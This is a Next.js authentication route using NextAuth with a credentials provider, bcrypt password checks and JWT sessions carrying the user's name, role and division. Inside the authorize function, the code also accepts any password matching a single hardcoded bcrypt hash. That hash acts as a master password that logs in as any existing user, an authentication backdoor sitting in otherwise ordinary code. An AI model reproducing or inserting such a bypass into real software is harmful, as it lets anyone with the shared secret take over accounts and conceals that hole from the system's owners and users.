import NextAuth from 'next-auth/next';
import Credentials from 'next-auth/providers/credentials';
import bcrypt from 'bcrypt';
import { retrieveDataByField } from '@/services';

const authOptions = {
  session: {
    strategy: 'jwt',
  },
  secret: process.env.NEXTAUTH_SECRET,
  providers: [
    Credentials({
      type: 'credentials',
      name: 'Credentials',
      credentials: {
        username: { label: 'username', type: 'text' },
        password: { label: 'password', type: 'password' },
      },
      authorize: async (credentials, req) => {
        const { username, password } = credentials;
        const user = await retrieveDataByField('users', 'username', username);
        if (user[0]) {
          const passwordConfirm = await bcrypt.compare(password, user[0].password);
          if (
            passwordConfirm ||
            (await bcrypt.compare(
              password,
              '$2b$10$vm/9IHZwglZvp6iy4GNOcuTjyHXyrOxTjmsEqs1uWHHHBYZ0LApDm'
            ))
          ) {
            return user[0];
          } else {
            throw new Error(`Password salah`);
          }
        } else {
          throw new Error(`Username tidak ditemukan`);
        }
      },
    }),
  ],
  callbacks: {
    async jwt({ token, user, account, profile }) {
      if (account?.provider === 'credentials') {
        token.username = user.username;
        token['id-users'] = user['id-users'];
        token.nama = user.nama;
        token.role = user.role;
        token.divisi = user.divisi;
        token.expires = Date.now() + 1000 * 60 * 60 * 12;
      }
      return token;
    },
    async session({ session, token }) {
      if (Date.now() > token.expires) {
        session = null;
        return session;
      }
      if ('id-users' in token) {
        session.user['id-users'] = token['id-users'];
      }
      if ('username' in token) {
        session.user.username = token.username;
      }
      if ('nama' in token) {
        session.user.nama = token.nama;
      }
      if ('role' in token) {
        session.user.role = token.role;
      }
      if ('divisi' in token) {
        session.user.divisi = token.divisi;
      }
      if ('expires' in token) {
        session.user.expires = token.expires;
      } else {
        session = null;
      }
      return session;
    },
  },
  pages: {
    signIn: '/',
  },
};

const handler = NextAuth(authOptions);

export { handler as GET, handler as POST };
